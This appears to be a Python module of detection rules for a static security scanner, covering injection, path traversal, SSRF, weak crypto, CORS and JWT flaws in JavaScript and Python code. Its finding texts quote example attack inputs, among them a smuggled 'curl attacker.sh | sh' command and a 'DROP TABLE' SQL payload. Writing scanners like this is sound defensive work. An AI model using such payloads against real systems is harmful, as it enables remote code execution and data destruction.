"""Security rules for JavaScript/TypeScript and Python.

The engine had two `security/` rules before this module: "you committed a
secret" and "you did not gitignore `.env`". Everything a scanner is actually
reached for — injection, traversal, SSRF, weak crypto — was absent, which is
why the findings did not justify the interface.

The temptation is to close that gap with a regex per vulnerability class. That
produces a noise generator: `exec(` appears in every subprocess wrapper ever
written, and a rule that cannot tell a literal from user input will cry wolf
until people stop reading the category. `python/subprocess-shell` already
handles this honestly, and this module follows it.

**The discipline.** Every rule here answers two questions separately:

1. *Is a dangerous sink present?* — cheap, and on its own worth only
   `Confidence.MEDIUM`, which the report does not surface by default.
2. *Does a request-derived value reach it?* — `REQUEST_SOURCE` below. When it
   does, the finding is `Confidence.HIGH` and says so in specific terms,
   naming the expression it followed.

That split is the whole design. A rule that cannot distinguish a literal from
an interpolated variable does not ship, and where the distinction cannot be
made from a single file the finding is downgraded rather than dropped — the
evidence is real even when the exploitability is not established.

Single-file analysis is the limit. There is no cross-file taint tracking here
and this module does not pretend otherwise; a value tainted in one module and
used in another is not detected. That is stated in the finding text rather than
hidden, because a scanner that overstates its reach is worse than one with a
documented edge.
"""

from __future__ import annotations

import re

from app.analysis.base import (
    RuleContext,
    iter_code_lines,
    register,
    strip_comments_and_strings,
)
from app.ingest.snapshot import SourceFile
from app.schemas import Category, Confidence, Finding, Severity

MAX_FINDINGS_PER_RULE = 25

JS = ("javascript", "typescript")

# Tests exercise dangerous functions on purpose. The Python rules already
# learned this the expensive way — seven deserialisation findings on
# `psf/requests`, every one a test testing deserialisation — so security rules
# skip tests in both ecosystems.
_TEST_PATH = re.compile(
    r"(^|/)(tests?|testing|__tests__|spec|e2e|fixtures?)/"
    r"|(^|/)(test_[^/]+|[^/]+_test)\.py$"
    r"|\.(test|spec)\.[jt]sx?$",
    re.IGNORECASE,
)


def is_test_path(path: str) -> bool:
    return bool(_TEST_PATH.search(path))


# Third-party code and build output. Not ours to fix, and usually minified —
# a single line thousands of characters long, where any substring can look
# like anything.
#
# `payatu/Tiredful-API` reported a SQL injection in
# `static/rest_framework/docs/js/highlight.pack.js`, a vendored syntax
# highlighter, and it led the report summary. Editing a vendored bundle is not
# a fix, so a finding there is noise however true it is; the actionable version
# of that problem is a dependency finding about the package.
_VENDOR_PATH = re.compile(
    r"(^|/)(vendor|vendors|third[-_]?party|node_modules|bower_components"
    r"|dist|build|out|static|public|assets|site-packages)/"
    r"|\.(?:min|pack|bundle|chunk)\.[jt]sx?$",
    re.IGNORECASE,
)


def is_vendored(path: str) -> bool:
    return bool(_VENDOR_PATH.search(path))


def sources(ctx: RuleContext, *languages: str) -> list[SourceFile]:
    """Analysable files in the given languages, tests and vendored code out."""
    return [
        s
        for s in ctx.snapshot.by_language(*languages)
        if not is_test_path(s.path) and not is_vendored(s.path)
    ]


# --------------------------------------------------------------------------
# Taint-lite
# --------------------------------------------------------------------------

# Values that came from outside the process. Deliberately a closed list of
# framework accessors rather than "any variable": the point is to be right when
# it fires, and every entry here is unambiguously attacker-influenced.
#
# Express/Koa/Next, Flask/Django/FastAPI, and the two runtime sources that are
# input in the same sense.
# Every accessor ends at a word boundary. Without one, `url` matched the `url`
# inside `urllib.request.urlopen`, so `flask_security`'s HaveIBeenPwned lookup —
# a constant URL with a hash appended — was reported as an SSRF. Found by
# scanning a corpus of real applications, not by a test.
REQUEST_SOURCE = re.compile(
    r"""\b(?:
        req(?:uest)?\s*\.\s*(?:query|body|params|headers|cookies|url|path)\b
      | ctx\s*\.\s*(?:query|request|params)\b
      | request\s*\.\s*(?:args|form|json|values|data|files|GET|POST|headers|COOKIES)\b
      | event\s*\.\s*(?:queryStringParameters|pathParameters|body)\b
      | searchParams\s*\.\s*get\b
      | process\s*\.\s*argv\b
      | (?:sys\s*\.\s*)?argv\b
      | input\s*\(
    )""",
    re.IGNORECASE | re.VERBOSE,
)

# The value is being built, not stated: template literal, concatenation,
# f-string, %-format or .format(). A dangerous call whose argument is a plain
# literal is not interesting.
_TEMPLATE = re.compile(r"\$\{")
_CONCAT = re.compile(r"[\"'`]\s*\+|\+\s*[\"'`]")
_FSTRING = re.compile(r"\bf[\"']")
_PERCENT = re.compile(r"[\"']\s*%\s*[\w(]|%s")
_FORMAT = re.compile(r"[\"'][^\"']*[\"']\s*\.\s*format\s*\(")


def is_built(expr: str) -> bool:
    """Whether the expression is assembled from parts rather than literal."""
    return any(
        pattern.search(expr)
        for pattern in (_TEMPLATE, _CONCAT, _FSTRING, _PERCENT, _FORMAT)
    )


def tainted(expr: str) -> bool:
    """Whether a request-derived value appears in the expression."""
    return bool(REQUEST_SOURCE.search(expr))


# Identifiers the expression interpolates: `${name}`, `{name}`, `% name`,
# `+ name`, `.format(name)`. Deliberately loose — a name that turns out not to
# be assigned from a request source simply does not match below.
_INTERPOLATED = re.compile(
    r"\$\{\s*([A-Za-z_]\w*)|\{\s*([A-Za-z_]\w*)\s*\}|"
    r"%\s*\(?\s*([A-Za-z_]\w*)|\+\s*([A-Za-z_]\w*)|format\s*\(\s*([A-Za-z_]\w*)"
)

# How far back a variable's assignment may be. Four lines covers the shape
# below without reaching across a function boundary in practice.
_ASSIGNMENT_LOOKBACK = 4


def tainted_via_local(source: SourceFile, number: int, expr: str) -> bool:
    """Whether an interpolated *variable* was assigned from the request nearby.

    The commonest real shape puts the taint one statement above the sink::

        month_requested = request.data['month']
        ...
        Tracker.objects.raw('… where month=%s' % month_requested)

    Confidence is deliberately graded on the statement alone, so that an
    unrelated `req.query` three lines up cannot promote unproven evidence to a
    CRITICAL finding. That guard is right and it is also why the case above was
    missed on `payatu/Tiredful-API`, a deliberately vulnerable app.

    The resolution is not a wider window but a narrower question: take the
    identifiers this expression actually interpolates, and look for *those
    names* being assigned from a request source. Unrelated taint on a
    neighbouring line still cannot reach it, because the name has to match.
    """
    names = {g for match in _INTERPOLATED.finditer(expr) for g in match.groups() if g}
    if not names:
        return False

    lines = source.lines()
    start = max(0, number - 1 - _ASSIGNMENT_LOOKBACK)
    for line in lines[start : number - 1]:
        for name in names:
            # `name = <something request-derived>`, not `name == …`.
            assignment = re.search(rf"\b{re.escape(name)}\s*=(?!=)(.*)$", line)
            if assignment and REQUEST_SOURCE.search(assignment.group(1)):
                return True
    return False


def grade(
    expr: str,
    *,
    source: SourceFile | None = None,
    number: int | None = None,
) -> tuple[Severity, Confidence] | None:
    """Severity/confidence for a sink reached by ``expr``, or ``None`` to skip.

    The three-way split every rule in this module shares:

    - built *and* request-derived -> the real thing, reported loudly
    - built from something else    -> real evidence, unproven reachability
    - a plain literal              -> not a finding at all
    """
    if not is_built(expr):
        return None
    if tainted(expr):
        return Severity.CRITICAL, Confidence.HIGH
    # The same value, assigned from the request a line or two above. Only the
    # names this expression interpolates are followed — see `tainted_via_local`.
    if source is not None and number is not None and tainted_via_local(source, number, expr):
        return Severity.CRITICAL, Confidence.HIGH
    return Severity.MEDIUM, Confidence.MEDIUM


def iter_literal_lines(source: SourceFile) -> list[tuple[int, str]]:
    """(line number, *raw* line) for lines that contain real code.

    `iter_code_lines` blanks string contents, which is right for rules looking
    for code constructs and wrong for rules whose whole signal lives inside a
    string literal: `createHash('md5')`, `origin: '*'`, `algorithms: ['none']`.
    Against blanked source those read as `createHash('')` and never match.

    Scanning the raw line instead would match inside comments, so the blanked
    line is still used — as a mask. A line whose blanked form is entirely
    whitespace was nothing but a comment, and is skipped; anything else is
    yielded intact.
    """
    text = source.text()
    if not text:
        return []
    blanked = strip_comments_and_strings(text, source.language).splitlines()
    raw = text.splitlines()
    # `strict=False`: the two are the same length by construction, since
    # `strip_comments_and_strings` rebuilds the text line for line. If that
    # ever stopped holding, truncating is the right failure — a scan that
    # misses the tail of one file beats one that raises and loses the report.
    return [
        (number, raw_line)
        for number, (raw_line, masked) in enumerate(
            zip(raw, blanked, strict=False), start=1
        )
        if masked.strip()
    ]


def _around(source: SourceFile, number: int, before: int = 3, after: int = 3) -> str:
    """Raw lines either side of ``number``.

    Some sinks sit *before* the value they consume and some after. The common
    SQL shape puts them on separate lines entirely:

        const sql =
          `SELECT … WHERE id = ${req.query.id}`;
        const rows = await db.query(sql);

    A forward-only window anchored on the sink misses the statement, and one
    anchored on the statement misses the sink.
    """
    lines = source.lines()
    start = max(0, number - 1 - before)
    return "\n".join(lines[start : number + after])


def _context(source: SourceFile, number: int, span: int = 2) -> str:
    """The line plus a little after it.

    Sinks are routinely split across lines — the call opens on one line and the
    interpolated argument lands on the next. Matching a single line misses
    those, and matching the whole file loses the anchor.
    """
    lines = source.lines()
    start = max(0, number - 1)
    return "\n".join(lines[start : start + span])


def _emit(
    ctx: RuleContext,
    findings: list[Finding],
    *,
    rule_id: str,
    title: str,
    description: str,
    severity: Severity,
    confidence: Confidence,
    source: SourceFile,
    line: int,
    remediation: str,
    references: list[str],
    category: Category = Category.SECURITY,
) -> None:
    findings.append(
        ctx.finding(
            rule_id=rule_id,
            title=title,
            description=description,
            category=category,
            severity=severity,
            confidence=confidence,
            file=source.path,
            line=line,
            remediation=remediation,
            references=references,
        )
    )


# --------------------------------------------------------------------------
# Injection
# --------------------------------------------------------------------------

_SQL_SINK = re.compile(
    r"\.\s*(?:query|execute|executemany|raw|exec)\s*\(|\bsequelize\s*\.\s*query\s*\(",
    re.IGNORECASE,
)
_SQL_KEYWORD = re.compile(
    r"\b(?:SELECT|INSERT\s+INTO|UPDATE|DELETE\s+FROM|DROP\s+TABLE|UNION\s+SELECT)\b",
    re.IGNORECASE,
)
# A parameterised call is the fix, and saying so about code that already does it
# is the fastest way to lose a reader.
_PARAMETERISED = re.compile(r"\?|\$\d|%s\s*[\"']?\s*,|:\w+\s*[\"']?\s*,")


@register
class SqlInjectionRule:
    id = "security/sql-injection"
    name = "SQL built by string interpolation"
    category = Category.SECURITY

    def applies(self, ctx: RuleContext) -> bool:
        return ctx.facts.is_node or ctx.facts.is_python

    async def run(self, ctx: RuleContext) -> list[Finding]:
        findings: list[Finding] = []
        for source in sources(ctx, *JS, "python"):
            if len(findings) >= MAX_FINDINGS_PER_RULE:
                break
            # Raw lines: the statement itself is a string literal, so on
            # blanked source there is no `SELECT` left to find.
            for number, line in iter_literal_lines(source):
                if not _SQL_KEYWORD.search(line):
                    continue
                # The sink may be on either side of the statement.
                window = _around(source, number)
                if not _SQL_SINK.search(window):
                    continue
                # Interpolation is judged on the statement itself — its own
                # line plus its continuation — never on the whole window. A
                # `${...}` three lines above belongs to different code, and
                # grading on it would attribute someone else's taint to this
                # statement and report MEDIUM evidence as a CRITICAL finding.
                verdict = grade(_context(source, number, span=3), source=source, number=number)
                if verdict is None:
                    continue
                # `db.query("SELECT … WHERE id = ?", [id])` is the fix, not the
                # bug. Only the placeholder form is exempt — a `+` next to a
                # placeholder is still concatenation.
                if _PARAMETERISED.search(window) and not tainted(window):
                    continue

                severity, confidence = verdict
                proven = confidence is Confidence.HIGH
                _emit(
                    ctx,
                    findings,
                    rule_id=self.id,
                    title="SQL statement assembled from an interpolated value",
                    description=(
                        "A SQL statement is built by string interpolation and "
                        "handed to a query call. "
                        + (
                            "The interpolated value comes from the request, so "
                            "an attacker controls part of the statement's "
                            "structure — not just the data it compares against. "
                            "A value of `1 OR 1=1` changes which rows are "
                            "returned; `1; DROP TABLE users` changes what the "
                            "statement does."
                            if proven
                            else "Whether the value reaches user input could not "
                            "be established from this file alone, so this is "
                            "evidence rather than a proven vulnerability. If the "
                            "value is a constant, it is safe."
                        )
                    ),
                    severity=severity,
                    confidence=confidence,
                    source=source,
                    line=number,
                    remediation=(
                        "Pass the value as a bound parameter instead of "
                        "concatenating it. The driver then sends the statement "
                        "and the data separately, so the value can never be "
                        "read as SQL:\n\n"
                        "`db.query('SELECT * FROM users WHERE id = $1', [id])`\n\n"
                        "In Python, `cursor.execute('… WHERE id = %s', (id,))` — "
                        "note the comma; the parameters are a tuple, not "
                        "string formatting."
                    ),
                    references=["https://cwe.mitre.org/data/definitions/89.html"],
                )
                break  # one per file is enough to make the point
        return findings


_JS_COMMAND_SINK = re.compile(
    r"\b(?:child_process\s*\.\s*)?(?:exec|execSync|spawn|spawnSync|execFile)\s*\(",
)
_SHELL_TRUE_JS = re.compile(r"shell\s*:\s*true")


@register
class CommandInjectionRule:
    id = "security/command-injection"
    name = "Shell command built from an interpolated value"
    category = Category.SECURITY

    def applies(self, ctx: RuleContext) -> bool:
        return ctx.facts.is_node

    async def run(self, ctx: RuleContext) -> list[Finding]:
        findings: list[Finding] = []
        for source in sources(ctx, *JS):
            if len(findings) >= MAX_FINDINGS_PER_RULE:
                break
            for number, line in iter_code_lines(source):
                match = _JS_COMMAND_SINK.search(line)
                if not match:
                    continue
                window = _context(source, number)
                verdict = grade(window, source=source, number=number)
                if verdict is None:
                    continue
                # `spawn`/`execFile` pass an argv array and do not involve a
                # shell, so interpolation there is not shell syntax — unless the
                # call explicitly asks for one.
                call = match.group(0)
                argv_form = call.startswith(("spawn", "execFile"))
                if argv_form and not _SHELL_TRUE_JS.search(window):
                    continue

                severity, confidence = verdict
                proven = confidence is Confidence.HIGH
                _emit(
                    ctx,
                    findings,
                    rule_id=self.id,
                    title="Shell command built from an interpolated value",
                    description=(
                        "A command string is assembled by interpolation and run "
                        "through a shell, so every shell metacharacter in the "
                        "interpolated value is syntax. "
                        + (
                            "The value comes from the request. A filename of "
                            "`a; curl attacker.sh | sh` stops being a filename "
                            "and becomes a second command."
                            if proven
                            else "Whether the value reaches user input could not "
                            "be established from this file alone."
                        )
                    ),
                    severity=severity,
                    confidence=confidence,
                    source=source,
                    line=number,
                    remediation=(
                        "Use `execFile` or `spawn` with an argument array and no "
                        "shell:\n\n"
                        "`execFile('git', ['show', ref])`\n\n"
                        "The arguments are passed to the process directly, so a "
                        "`;` in `ref` is a literal semicolon rather than a "
                        "command separator."
                    ),
                    references=["https://cwe.mitre.org/data/definitions/78.html"],
                )
                break
        return findings


_EVAL_JS = re.compile(r"\beval\s*\(|\bnew\s+Function\s*\(")
_EVAL_PY = re.compile(r"\b(?:eval|exec)\s*\(")


@register
class CodeInjectionRule:
    id = "security/code-injection"
    name = "Code evaluated at runtime"
    category = Category.SECURITY

    def applies(self, ctx: RuleContext) -> bool:
        return ctx.facts.is_node or ctx.facts.is_python

    async def run(self, ctx: RuleContext) -> list[Finding]:
        findings: list[Finding] = []
        for source in sources(ctx, *JS, "python"):
            if len(findings) >= MAX_FINDINGS_PER_RULE:
                break
            pattern = _EVAL_PY if source.language == "python" else _EVAL_JS
            for number, line in iter_code_lines(source):
                if not pattern.search(line):
                    continue
                window = _context(source, number)
                is_tainted = tainted(window)
                built = is_built(window)
                # `eval` on a literal is a code smell, not a vulnerability, and
                # this rule is not the place to say so.
                if not built and not is_tainted:
                    continue

                severity, confidence = (
                    (Severity.CRITICAL, Confidence.HIGH)
                    if is_tainted
                    else (Severity.HIGH, Confidence.MEDIUM)
                )
                _emit(
                    ctx,
                    findings,
                    rule_id=self.id,
                    title="Runtime code evaluation of a constructed string",
                    description=(
                        "A string built at runtime is evaluated as code. "
                        + (
                            "The string incorporates a request-derived value, "
                            "which means an attacker can supply the code that "
                            "runs — the most direct form of remote code "
                            "execution there is."
                            if is_tainted
                            else "The source of the string could not be traced "
                            "from this file alone."
                        )
                    ),
                    severity=severity,
                    confidence=confidence,
                    source=source,
                    line=number,
                    remediation=(
                        "Replace evaluation with an explicit dispatch. If the "
                        "string selects behaviour, map it:\n\n"
                        "`const handler = HANDLERS[name]; if (handler) handler()`\n\n"
                        "If it is data, parse it as data — `JSON.parse` for JSON, "
                        "`ast.literal_eval` for Python literals. Neither can "
                        "execute what it reads."
                    ),
                    references=["https://cwe.mitre.org/data/definitions/95.html"],
                )
                break
        return findings


# --------------------------------------------------------------------------
# Traversal and SSRF
# --------------------------------------------------------------------------

_FS_SINK = re.compile(
    r"\bfs(?:\.promises)?\s*\.\s*(?:readFile|readFileSync|writeFile|writeFileSync"
    r"|createReadStream|createWriteStream|unlink|unlinkSync)\s*\(|\bsendFile\s*\(",
)
_PY_FS_SINK = re.compile(r"\bopen\s*\(|\bPath\s*\([^)]*\)\s*\.\s*(?:read_text|read_bytes|open)\s*\(")
# Normalisation that actually constrains the path.
_PATH_GUARDED = re.compile(
    r"\bbasename\s*\(|\bpath\.resolve\s*\([^)]*\)\s*\.\s*startsWith|"
    r"\.startsWith\s*\(|\bis_relative_to\s*\(|\bcommonpath\s*\(|\bsafe_join\s*\(",
)


@register
class PathTraversalRule:
    id = "security/path-traversal"
    name = "Filesystem path built from request input"
    category = Category.SECURITY

    def applies(self, ctx: RuleContext) -> bool:
        return ctx.facts.is_node or ctx.facts.is_python

    async def run(self, ctx: RuleContext) -> list[Finding]:
        findings: list[Finding] = []
        for source in sources(ctx, *JS, "python"):
            if len(findings) >= MAX_FINDINGS_PER_RULE:
                break
            sink = _PY_FS_SINK if source.language == "python" else _FS_SINK
            for number, line in iter_code_lines(source):
                if not sink.search(line):
                    continue
                window = _context(source, number)
                # Traversal needs input; an unproven filesystem call is not a
                # finding worth anyone's time.
                if not tainted(window):
                    continue
                if _PATH_GUARDED.search(window):
                    continue

                _emit(
                    ctx,
                    findings,
                    rule_id=self.id,
                    title="Filesystem path built from request input",
                    description=(
                        "A request-derived value is used to build a filesystem "
                        "path with no containment check. `../../etc/passwd` is a "
                        "valid relative path, so the caller chooses which file "
                        "is read, not just which of the intended files."
                    ),
                    severity=Severity.HIGH,
                    confidence=Confidence.HIGH,
                    source=source,
                    line=number,
                    remediation=(
                        "Resolve the path and confirm it is still inside the "
                        "directory you meant:\n\n"
                        "```\n"
                        "const full = path.resolve(ROOT, userPath);\n"
                        "if (!full.startsWith(ROOT + path.sep)) throw new Error('outside root');\n"
                        "```\n\n"
                        "In Python, `Path(root, user).resolve().is_relative_to(root)`. "
                        "Stripping `..` textually is not equivalent — it misses "
                        "encoded and symlinked forms."
                    ),
                    references=["https://cwe.mitre.org/data/definitions/22.html"],
                )
                break
        return findings


_HTTP_SINK = re.compile(
    r"\b(?:fetch|axios(?:\s*\.\s*(?:get|post|put|delete|request))?|got|superagent"
    r"|requests\s*\.\s*(?:get|post|put|delete|head|request)"
    r"|urlopen|httpx\s*\.\s*(?:get|post|AsyncClient))\s*\(",
)
_URL_ALLOWLISTED = re.compile(r"\bALLOW|allowlist|whitelist|\bnew URL\s*\([^)]*,\s*\w", re.IGNORECASE)


@register
class SsrfRule:
    id = "security/ssrf"
    name = "Outbound request to a request-derived URL"
    category = Category.SECURITY

    def applies(self, ctx: RuleContext) -> bool:
        return ctx.facts.is_node or ctx.facts.is_python

    async def run(self, ctx: RuleContext) -> list[Finding]:
        findings: list[Finding] = []
        for source in sources(ctx, *JS, "python"):
            if len(findings) >= MAX_FINDINGS_PER_RULE:
                break
            for number, line in iter_code_lines(source):
                if not _HTTP_SINK.search(line):
                    continue
                window = _context(source, number)
                if not tainted(window):
                    continue
                if _URL_ALLOWLISTED.search(window):
                    continue

                _emit(
                    ctx,
                    findings,
                    rule_id=self.id,
                    title="Outbound request to a URL from the request",
                    description=(
                        "The server makes an HTTP request to a URL derived from "
                        "the incoming request. The server can reach hosts the "
                        "caller cannot — cloud metadata endpoints, internal "
                        "admin services, databases bound to localhost — so this "
                        "turns the server into a proxy into its own network."
                    ),
                    severity=Severity.HIGH,
                    confidence=Confidence.HIGH,
                    source=source,
                    line=number,
                    remediation=(
                        "Do not let the caller choose the host. Accept an "
                        "identifier and map it to a URL you control, or validate "
                        "the parsed host against an allowlist before the request "
                        "— and re-check after redirects, since a permitted host "
                        "can redirect to an internal one."
                    ),
                    references=["https://cwe.mitre.org/data/definitions/918.html"],
                )
                break
        return findings


# --------------------------------------------------------------------------
# Crypto and configuration
# --------------------------------------------------------------------------

_WEAK_HASH = re.compile(
    r"createHash\s*\(\s*[\"'](?P<js>md5|sha1)[\"']|"
    r"\bhashlib\s*\.\s*(?P<py>md5|sha1)\s*\(",
    re.IGNORECASE,
)
# Hashing is only weak relative to its purpose. A cache key or an ETag is a
# perfectly good use of MD5, and flagging those is how a rule gets ignored.
_SECURITY_PURPOSE = re.compile(
    r"password|passwd|secret|token|signature|signing|hmac|auth|credential|salt",
    re.IGNORECASE,
)


@register
class WeakHashRule:
    id = "security/weak-hash"
    name = "Broken hash used for a security purpose"
    category = Category.SECURITY

    def applies(self, ctx: RuleContext) -> bool:
        return ctx.facts.is_node or ctx.facts.is_python

    async def run(self, ctx: RuleContext) -> list[Finding]:
        findings: list[Finding] = []
        for source in sources(ctx, *JS, "python"):
            if len(findings) >= MAX_FINDINGS_PER_RULE:
                break
            # Raw lines: the algorithm name lives inside a string literal.
            for number, line in iter_literal_lines(source):
                match = _WEAK_HASH.search(line)
                if not match:
                    continue
                window = _context(source, number, span=3)
                if not _SECURITY_PURPOSE.search(window):
                    continue

                algorithm = (match.group("js") or match.group("py") or "").upper()
                _emit(
                    ctx,
                    findings,
                    rule_id=self.id,
                    title=f"{algorithm} used for a security purpose",
                    description=(
                        f"{algorithm} is used in code that names a password, "
                        "token or signature. Both algorithms have practical "
                        "collision attacks and both are fast, which is the "
                        "opposite of what password storage needs — a GPU tries "
                        "billions of candidates a second against them."
                    ),
                    severity=Severity.HIGH,
                    confidence=Confidence.MEDIUM,
                    source=source,
                    line=number,
                    remediation=(
                        "For passwords use a deliberately slow, salted KDF — "
                        "`argon2`, `bcrypt` or `scrypt`. For signatures and "
                        "integrity use SHA-256 or better, and `hmac` with a key "
                        "rather than a bare hash. If this hash is a cache key or "
                        "an ETag it is fine as it is."
                    ),
                    references=["https://cwe.mitre.org/data/definitions/327.html"],
                )
        return findings


_INSECURE_RANDOM = re.compile(r"\bMath\s*\.\s*random\s*\(\)|\brandom\s*\.\s*(?:random|randint|choice)\s*\(")
_SECRET_TARGET = re.compile(
    r"token|secret|password|passwd|key|nonce|salt|otp|session|csrf|reset|verify",
    re.IGNORECASE,
)


@register
class InsecureRandomRule:
    id = "security/insecure-random"
    name = "Predictable randomness used for a secret"
    category = Category.SECURITY

    def applies(self, ctx: RuleContext) -> bool:
        return ctx.facts.is_node or ctx.facts.is_python

    async def run(self, ctx: RuleContext) -> list[Finding]:
        findings: list[Finding] = []
        for source in sources(ctx, *JS, "python"):
            if len(findings) >= MAX_FINDINGS_PER_RULE:
                break
            for number, line in iter_code_lines(source):
                if not _INSECURE_RANDOM.search(line):
                    continue
                # Only when the value is going somewhere security-relevant.
                # `Math.random()` picking a placeholder colour is not a defect.
                if not _SECRET_TARGET.search(line):
                    continue

                _emit(
                    ctx,
                    findings,
                    rule_id=self.id,
                    title="Security value generated from a predictable source",
                    description=(
                        "A token, key or session value is generated with a "
                        "general-purpose pseudo-random generator. These are "
                        "seeded predictably and are not designed to resist "
                        "an attacker reconstructing their state — observing a "
                        "few outputs can be enough to predict the next one."
                    ),
                    severity=Severity.HIGH,
                    confidence=Confidence.HIGH,
                    source=source,
                    line=number,
                    remediation=(
                        "Use the cryptographic generator: `crypto.randomBytes(32)` "
                        "or `crypto.randomUUID()` in Node, `secrets.token_urlsafe(32)` "
                        "in Python. They are drop-in for this purpose and no "
                        "slower in any way that matters here."
                    ),
                    references=["https://cwe.mitre.org/data/definitions/338.html"],
                )
        return findings


_CORS_WILDCARD = re.compile(
    r"Access-Control-Allow-Origin[\"']?\s*[,:]\s*[\"']\*[\"']|origin\s*:\s*[\"']\*[\"']",
    re.IGNORECASE,
)
_CORS_CREDENTIALS = re.compile(
    r"Access-Control-Allow-Credentials[\"']?\s*[,:]\s*[\"']?true|credentials\s*:\s*true",
    re.IGNORECASE,
)


@register
class PermissiveCorsRule:
    id = "security/permissive-cors"
    name = "Wildcard CORS origin with credentials"
    category = Category.SECURITY

    def applies(self, ctx: RuleContext) -> bool:
        return ctx.facts.is_node or ctx.facts.is_python

    async def run(self, ctx: RuleContext) -> list[Finding]:
        findings: list[Finding] = []
        for source in sources(ctx, *JS, "python"):
            if len(findings) >= MAX_FINDINGS_PER_RULE:
                break
            # Raw lines: the wildcard is the string `'*'`.
            for number, line in iter_literal_lines(source):
                if not _CORS_WILDCARD.search(line):
                    continue
                # A wildcard origin on its own is a deliberate choice for a
                # public API. It is only dangerous together with credentials.
                window = _context(source, number, span=6)
                if not _CORS_CREDENTIALS.search(window):
                    continue

                _emit(
                    ctx,
                    findings,
                    rule_id=self.id,
                    title="CORS allows any origin and sends credentials",
                    description=(
                        "The CORS configuration allows every origin *and* "
                        "permits credentials. Any site a signed-in user visits "
                        "can then call this API as them and read the response, "
                        "which is precisely what the same-origin policy exists "
                        "to prevent. Browsers reject this combination with a "
                        "literal `*`, so it usually appears where the origin is "
                        "reflected back — which has the same effect and is not "
                        "rejected."
                    ),
                    severity=Severity.HIGH,
                    confidence=Confidence.HIGH,
                    source=source,
                    line=number,
                    remediation=(
                        "Allow credentials only for origins you name. Keep an "
                        "explicit list and echo the request origin only when it "
                        "is on it; never reflect it unconditionally."
                    ),
                    references=["https://cwe.mitre.org/data/definitions/942.html"],
                )
        return findings


# Unambiguous on their own: these name JWT decoding or the option that turns
# its verification off.
_JWT_UNVERIFIED = re.compile(
    r"jwt\s*\.\s*decode\s*\(|jsonwebtoken\s*\.\s*decode\s*\(|"
    r"verify_signature[\"']?\s*:\s*False|"
    r"algorithms?\s*:\s*\[?\s*[\"']none[\"']",
    re.IGNORECASE,
)

# `verify=False` was in the pattern above and should never have been. It is a
# keyword argument shared by half of Python: `EmailValidation(verify=False)` in
# `flask_security` was reported as an unverified JWT, and so would
# `requests.get(url, verify=False)` — which is a real problem, but a *different*
# one, and calling it a JWT flaw is how a rule teaches people to distrust it.
#
# Kept, but only where JWT is actually in view.
_VERIFY_DISABLED = re.compile(r"verify\s*=\s*False", re.IGNORECASE)
_JWT_CONTEXT = re.compile(r"\bjwt\b|json\s*web\s*token|jsonwebtoken", re.IGNORECASE)
# `jwt.decode(token, key, algorithms=[...])` in PyJWT *is* verification.
_JWT_VERIFIED = re.compile(r"algorithms\s*=\s*\[|\bjwt\s*\.\s*verify\s*\(")


@register
class JwtUnverifiedRule:
    id = "security/jwt-unverified"
    name = "JWT read without verifying its signature"
    category = Category.SECURITY

    def applies(self, ctx: RuleContext) -> bool:
        return ctx.facts.is_node or ctx.facts.is_python

    async def run(self, ctx: RuleContext) -> list[Finding]:
        findings: list[Finding] = []
        for source in sources(ctx, *JS, "python"):
            if len(findings) >= MAX_FINDINGS_PER_RULE:
                break
            # Raw lines: `algorithms: ['none']` and the `verify_signature`
            # option key are both string literals.
            for number, line in iter_literal_lines(source):
                window = _context(source, number)

                if _JWT_UNVERIFIED.search(line):
                    pass
                elif _VERIFY_DISABLED.search(line) and _JWT_CONTEXT.search(window):
                    # `verify=False` only counts when JWT is in view — see the
                    # note on `_VERIFY_DISABLED`.
                    pass
                else:
                    continue

                if _JWT_VERIFIED.search(window) and "False" not in window:
                    continue

                _emit(
                    ctx,
                    findings,
                    rule_id=self.id,
                    title="JWT claims read without verifying the signature",
                    description=(
                        "A JWT is decoded without checking its signature. The "
                        "payload of a JWT is base64, not encryption — anyone "
                        "holding a token can rewrite the claims and re-encode "
                        "it. Trusting `sub` or `role` from an unverified token "
                        "means the caller chooses who they are."
                    ),
                    severity=Severity.CRITICAL,
                    confidence=Confidence.HIGH,
                    source=source,
                    line=number,
                    remediation=(
                        "Verify with the key and a fixed algorithm list: "
                        "`jwt.verify(token, secret, { algorithms: ['HS256'] })`, "
                        "or `jwt.decode(token, key, algorithms=['HS256'])` in "
                        "PyJWT. Pinning the algorithm matters — accepting the "
                        "token's own `alg` is what makes the `none` attack work."
                    ),
                    references=["https://cwe.mitre.org/data/definitions/347.html"],
                )
        return findings
